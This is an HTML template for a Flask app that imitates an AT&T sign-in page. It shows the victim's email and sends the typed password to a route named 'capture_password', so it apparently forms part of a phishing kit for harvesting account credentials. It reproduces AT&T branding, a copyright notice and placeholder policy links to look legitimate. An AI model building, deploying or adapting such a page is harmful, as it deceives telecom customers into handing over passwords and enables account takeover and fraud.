<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>AT&T Password Page</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background-color: #ffffff;
    }

    .login-container {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .login-box {
      width: 450px; /* reduced width */
      padding: 70px 30px; /* increased vertical padding */
      border-radius: 12px;
      border: 1px solid #e0e0e0;
      
      background-color: #fff;
      text-align: center;
    }

    .att-logo {
      width: 170px;
      margin-bottom: 1px;
    }

    .welcome-title {
      font-size: 35px;
      font-weight: 700;
      margin-bottom: 10px;
    }

    .user-info {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      font-size: 2px;
      font-weight: 2;
      margin-bottom: 30px;
      
    }

    .btn-att {
      background-color: #004792;
      color: white;
      font-weight: 600;
      font-size: 16px;
      height: 50px;
      border-radius: 30px;
    }

    .btn-att:hover {
      background-color: #003370;
    }

    .btn-forgot-link {
      font-size: 15px;
      color: #004792;
      text-decoration: none;
      display: inline-block;
      margin-top: 12px;
    }

    .btn-forgot-link:hover {
      text-decoration: underline;
    }

    .form-check-label {
      font-size: 15px;
    }

    .form-control {
      height: 48px;
      font-size: 16px;
    }

    .password-wrapper {
      position: relative;
    }

    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #004792;
      font-size: 15px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container login-container">
    <div class="login-box">
      <img src="{{ url_for('static', filename='att.png') }}" alt="AT&T Logo" class="att-logo" />
      <div class="welcome-title">Welcome</div>
      <h4 class="mb-3"> {{ email }}</h4>

      <form method="POST" action="{{ url_for('capture_password') }}">
        <div class="mb-3 text-start">
          <label for="password" class="form-label">Password</label>
          <div class="password-wrapper">
            <input type="password" class="form-control" id="password" name="password" />
            <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
          </div>
        </div>

        <div class="form-check mb-4 text-start">
          <input class="form-check-input" type="checkbox" id="keepSignedIn" />
          <label class="form-check-label" for="keepSignedIn">Keep me signed in</label>
        </div>

        <button type="submit" class="btn btn-att w-100 mb-3">Sign in</button>

        <!-- LEFT-ALIGNED Forgot Password -->
        <div class="text-start">
          <a href="#" class="btn-forgot-link">Forgot password?</a>
        </div>
      </form>
    </div>
  </div>

  <footer> style="text-align: center; font-size: 13px; color: #444; margin-top: 40px;">
  <div style="margin-bottom: 8px;">
    <a href="#" style="margin: 0 12px; color: #004792; text-decoration: none;">Legal policy center</a>
    <a href="#" style="margin: 0 12px; color: #004792; text-decoration: none;">Privacy policy</a>
    <a href="#" style="margin: 0 12px; color: #004792; text-decoration: none;">Terms of use</a>
    <a href="#" style="margin: 0 12px; color: #004792; text-decoration: none;">Accessibility</a>
    <a href="#" style="margin: 0 12px; color: #004792; text-decoration: none;">Your privacy choices</a>
  </div>
  <div style="color: #666; margin-bottom: 2px ">
    Â©2025 AT&T Intellectual Property. All rights reserved.
  </div>
</footer>

  <!-- Bootstrap JS and Icons -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" />

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const toggleBtn = document.querySelector(".toggle-password");
      const isHidden = passwordInput.type === "password";
      passwordInput.type = isHidden ? "text" : "password";
      toggleBtn.textContent = isHidden ? "Hide" : "Show";
    }
  </script>
</body>
</html>
